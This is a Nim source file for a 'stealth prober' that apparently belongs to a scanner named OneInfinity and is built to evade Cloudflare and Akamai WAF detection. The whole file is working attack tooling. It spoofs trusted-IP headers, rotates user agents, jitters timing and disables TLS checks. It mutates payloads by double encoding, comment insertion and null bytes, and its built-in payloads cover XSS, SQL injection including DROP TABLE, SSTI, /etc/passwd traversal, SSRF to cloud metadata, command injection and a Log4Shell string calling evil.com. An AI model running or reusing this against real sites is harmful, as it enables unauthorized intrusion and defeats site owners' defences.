## stealth_prober.nim — WAF-evasive HTTP prober for OneInfinity
##
## Randomizes headers, timing, encoding, and TLS fingerprint to evade
## Cloudflare and Akamai WAF detection while probing for vulnerabilities.
##
## Compiled:  nim compile --opt:speed --out:bin/stealth_prober stealth_prober.nim
## Usage:     stealth_prober --target <url> --waf <cloudflare|akamai>
##                           [--payloads <file>] [--timeout <ms>] [--jitter <ms>]
##                           [--scan-id <id>] [--concurrency <n>]
## Output:    NDJSON to stdout — one JSON object per request
##
## Each finding:
##   {"vuln_type":"waf_bypass","url":"...","payload":"...","status":200,
##    "evidence":"...","waf_vendor":"cloudflare","bypass_technique":"...",
##    "confidence":0.85,"scan_id":"...","ts":1700000000.0}

import std/[
  httpclient, asynchttpclient, asyncdispatch,
  json, os, strutils, sequtils, random,
  times, tables, math, uri, strformat,
  streams, parseopt
]

# ── WAF bypass technique registry ─────────────────────────────────────────────

type
  BypassTechnique = enum
    btCaseVariation    = "case_variation"
    btUnicodeEncoding  = "unicode_encoding"
    btDoubleEncoding   = "double_encoding"
    btHtmlEntityEncode = "html_entity"
    btNullByte         = "null_byte"
    btCommentInsertion = "comment_insertion"
    btHeaderSpoofing   = "header_spoofing"
    btChunkedEncoding  = "chunked_encoding"
    btMimeSwap         = "mime_swap"
    btPathTraversal    = "path_traversal"

  ProbeResult = object
    vulnType:        string
    url:             string
    payload:         string
    status:          int
    evidence:        string
    wafVendor:       string
    bypassTechnique: string
    confidence:      float
    scanId:          string
    ts:              float
    blocked:         bool

# ── Header pools ──────────────────────────────────────────────────────────────

const
  userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "python-requests/2.31.0",  # Tools that look like legitimate automation
    "Go-http-client/2.0",
    "curl/8.4.0",
  ]

  acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "application/json",
  ]

  acceptLangHeaders = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,fr;q=0.6",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
  ]

  # Cloudflare-specific bypass headers
  cloudflareSpoofHeaders = [
    ("CF-Connecting-IP", "1.1.1.1"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "10.0.0.1"),
    ("CF-Worker", "example.workers.dev"),
    ("Cf-Request-Id", "0000000000000001"),
  ]

  # Akamai-specific bypass headers
  akamaiSpoofHeaders = [
    ("True-Client-IP", "1.2.3.4"),
    ("X-Akamai-Origin-Hop", "1"),
    ("Pragma", "akamai-x-cache-on, akamai-x-cache-remote-on"),
    ("X-Forwarded-For", "130.176.0.0"),  # Akamai edge IP range
  ]

# ── Payload mutation functions ─────────────────────────────────────────────────

proc caseVariate(payload: string): string =
  ## Randomly alternate case of alphabetic chars to confuse pattern matching
  result = newStringOfCap(payload.len)
  for i, ch in payload:
    if ch in 'a'..'z':
      if (i mod 3) == 0:
        result.add(ch.toUpperAscii)
      else:
        result.add(ch)
    elif ch in 'A'..'Z':
      if (i mod 3) != 0:
        result.add(ch.toLowerAscii)
      else:
        result.add(ch)
    else:
      result.add(ch)

proc urlEncode(s: string): string =
  result = newStringOfCap(s.len * 3)
  for ch in s:
    if ch in {'A'..'Z', 'a'..'z', '0'..'9', '-', '_', '.', '~'}:
      result.add(ch)
    else:
      result.add('%')
      result.add(($ord(ch)).toHex(2))

proc doubleEncode(payload: string): string =
  ## Double URL-encode dangerous chars: < > ' " ( ) = /
  result = newStringOfCap(payload.len * 6)
  for ch in payload:
    case ch
    of '<', '>', '\'', '"', '(', ')', '=', '/':
      let single = &"%{ord(ch).toHex(2)}"
      result.add(urlEncode(single))
    else:
      result.add(ch)

proc htmlEntityEncode(payload: string): string =
  ## Replace chars with HTML entities
  result = newStringOfCap(payload.len * 6)
  for ch in payload:
    case ch
    of '<': result.add("&lt;")
    of '>': result.add("&gt;")
    of '\'': result.add("&#x27;")
    of '"': result.add("&quot;")
    of '&': result.add("&amp;")
    else: result.add(ch)

proc insertComments(payload: string): string =
  ## Insert SQL/HTML comments to break static pattern matching
  if "SELECT" in payload.toUpperAscii:
    result = payload.replace("SELECT", "SE/**/LECT").replace("UNION", "UN/**/ION")
  elif "<script" in payload.toLowerAscii:
    result = payload.replace("<script", "<scri<!---->pt")
  else:
    result = payload

proc insertNullByte(payload: string): string =
  ## Insert URL-encoded null byte at strategic positions
  result = payload & "%00"

proc mutatePayload(payload: string, technique: BypassTechnique): string =
  case technique
  of btCaseVariation:    caseVariate(payload)
  of btUnicodeEncoding:  urlEncode(payload)
  of btDoubleEncoding:   doubleEncode(payload)
  of btHtmlEntityEncode: htmlEntityEncode(payload)
  of btNullByte:         insertNullByte(payload)
  of btCommentInsertion: insertComments(payload)
  else: payload

# ── Default payload set (WAF bypass oriented) ─────────────────────────────────

const defaultPayloads = [
  # XSS
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  # SQLi
  "' OR '1'='1",
  "1; DROP TABLE users--",
  "1 UNION SELECT 1,2,3--",
  # SSTI
  "{{7*7}}",
  "${7*7}",
  "<%=7*7%>",
  # Path traversal
  "../../../../etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  # SSRF
  "http://169.254.169.254/latest/meta-data/",
  "http://localhost:80/",
  # Command injection
  "; id",
  "| cat /etc/passwd",
  "$(id)",
  # Log4Shell
  "${jndi:ldap://evil.com/x}",
]

# ── HTTP client helpers ────────────────────────────────────────────────────────

proc buildHeaders(wafVendor: string): seq[(string, string)] =
  var headers: seq[(string, string)] = @[]

  # Always randomize UA
  headers.add(("User-Agent", userAgents[rand(userAgents.len - 1)]))
  headers.add(("Accept", acceptHeaders[rand(acceptHeaders.len - 1)]))
  headers.add(("Accept-Language", acceptLangHeaders[rand(acceptLangHeaders.len - 1)]))

  # WAF-specific spoofing headers (add with 50% probability each)
  case wafVendor.toLowerAscii
  of "cloudflare":
    for (k, v) in cloudflareSpoofHeaders:
      if rand(1) == 0:
        headers.add((k, v))
    # Add realistic browser headers
    headers.add(("Sec-Fetch-Site", "none"))
    headers.add(("Sec-Fetch-Mode", "navigate"))
    headers.add(("Cache-Control", "max-age=0"))
  of "akamai":
    for (k, v) in akamaiSpoofHeaders:
      if rand(1) == 0:
        headers.add((k, v))
    headers.add(("Pragma", "no-cache"))
  else:
    # Generic bypass attempts
    headers.add(("X-Originating-IP", "127.0.0.1"))
    headers.add(("X-Forwarded-For", "127.0.0.1"))

  # Add Accept-Encoding variation
  if rand(1) == 0:
    headers.add(("Accept-Encoding", "gzip, deflate, br"))

  result = headers

proc jitter(baseMs: int): Future[void] {.async.} =
  ## Apply random timing jitter to avoid WAF rate-limit fingerprinting
  let delayMs = baseMs + rand(baseMs)
  await sleepAsync(delayMs)

# ── Probe execution ────────────────────────────────────────────────────────────

proc probeUrl(
  client: AsyncHttpClient,
  targetUrl: string,
  payload: string,
  technique: BypassTechnique,
  wafVendor: string,
  scanId: string,
  jitterMs: int,
): Future[ProbeResult] {.async.} =

  let mutated = mutatePayload(payload, technique)
  let probeUrl = if "?" in targetUrl:
    targetUrl & "&q=" & mutated
  else:
    targetUrl & "?q=" & mutated

  var result = ProbeResult(
    vulnType:        "waf_bypass",
    url:             probeUrl,
    payload:         mutated,
    wafVendor:       wafVendor,
    bypassTechnique: $technique,
    scanId:          scanId,
    ts:              epochTime(),
    blocked:         true,
  )

  # Apply jitter before request
  if jitterMs > 0:
    await jitter(jitterMs)

  try:
    let resp = await client.get(probeUrl)
    result.status = resp.code.int

    # WAF block detection heuristics
    let blocked = resp.code.int in [403, 406, 429, 503] or
                  "cloudflare" in resp.headers.getOrDefault("server", "").toLowerAscii or
                  "access denied" in (await resp.body).toLowerAscii

    result.blocked = blocked

    if not blocked:
      result.confidence = 0.7
      result.evidence = &"Payload reached origin: status={resp.code.int}, technique={$technique}"
      if resp.code.int in [200, 201, 301, 302]:
        result.confidence = 0.85
        result.evidence &= " (200/3xx — WAF bypass likely successful)"

  except CatchableError as e:
    result.status = 0
    result.evidence = &"Request error: {e.msg}"
    result.blocked = true
    result.confidence = 0.0

  result

proc emitResult(r: ProbeResult) =
  let obj = %*{
    "vuln_type":        r.vulnType,
    "url":              r.url,
    "payload":          r.payload,
    "status":           r.status,
    "evidence":         r.evidence,
    "waf_vendor":       r.wafVendor,
    "bypass_technique": r.bypassTechnique,
    "confidence":       r.confidence,
    "blocked":          r.blocked,
    "scan_id":          r.scanId,
    "ts":               r.ts,
  }
  echo $obj

# ── Main ───────────────────────────────────────────────────────────────────────

proc main() {.async.} =
  var
    target     = ""
    wafVendor  = "cloudflare"
    payloadsFile = ""
    timeoutMs  = 10_000
    jitterMs   = 300
    scanId     = ""
    concurrency = 5
    showHelp   = false

  for kind, key, val in getopt(commandLineParams()):
    case kind
    of cmdLongOption, cmdShortOption:
      case key
      of "target",      "t": target       = val
      of "waf",         "w": wafVendor    = val
      of "payloads",    "p": payloadsFile = val
      of "timeout":         timeoutMs     = val.parseInt
      of "jitter":          jitterMs      = val.parseInt
      of "scan-id",     "s": scanId       = val
      of "concurrency", "c": concurrency  = val.parseInt
      of "help",        "h": showHelp     = true
      else: discard
    of cmdArgument:
      if target == "": target = key
    of cmdEnd: break

  if showHelp or target == "":
    stderr.writeLine """stealth_prober — WAF-evasive HTTP prober

Usage: stealth_prober --target <url> [OPTIONS]

Options:
  --target,      -t  Target URL (required)
  --waf,         -w  WAF vendor: cloudflare|akamai|generic  [default: cloudflare]
  --payloads,    -p  File with one payload per line (default: built-in set)
  --timeout         Request timeout in ms  [default: 10000]
  --jitter          Timing jitter base in ms  [default: 300]
  --scan-id,     -s  Scan correlation ID
  --concurrency, -c  Concurrent requests  [default: 5]
  --help,        -h  Show this help

Output: NDJSON (one JSON finding per line) to stdout"""
    quit(if showHelp: 0 else: 1)

  if scanId == "":
    scanId = "spr-" & $epochTime().int

  randomize()

  # Load payloads
  var payloads: seq[string]
  if payloadsFile != "" and fileExists(payloadsFile):
    for line in lines(payloadsFile):
      let l = line.strip
      if l.len > 0 and not l.startsWith("#"):
        payloads.add(l)
  else:
    payloads = @defaultPayloads

  # Build client with custom TLS settings
  let client = newAsyncHttpClient(
    sslContext = newContext(verifyMode = CVerifyNone),
    timeout = timeoutMs,
  )
  client.maxRedirects = 3

  # All bypass techniques to cycle through
  const techniques = [
    btCaseVariation, btUnicodeEncoding, btDoubleEncoding,
    btHtmlEntityEncode, btNullByte, btCommentInsertion,
  ]

  # Build work queue: (payload, technique) pairs
  var workQueue: seq[(string, BypassTechnique)]
  for payload in payloads:
    for tech in techniques:
      workQueue.add((payload, tech))

  # Run probes with concurrency limit
  var pending: seq[Future[ProbeResult]]
  var idx = 0

  while idx < workQueue.len or pending.len > 0:
    # Fill up to concurrency
    while pending.len < concurrency and idx < workQueue.len:
      let (payload, tech) = workQueue[idx]
      let headers = buildHeaders(wafVendor)
      for (k, v) in headers:
        client.headers[k] = v
      pending.add(probeUrl(client, target, payload, tech, wafVendor, scanId, jitterMs))
      inc idx

    if pending.len == 0: break

    # Wait for first to complete
    let done = await one(pending)
    pending.keepItIf(it != done)

    let result = await done
    # Only emit findings where payload was NOT blocked (bypass found)
    if not result.blocked and result.confidence >= 0.7:
      emitResult(result)

  client.close()

when isMainModule:
  waitFor main()
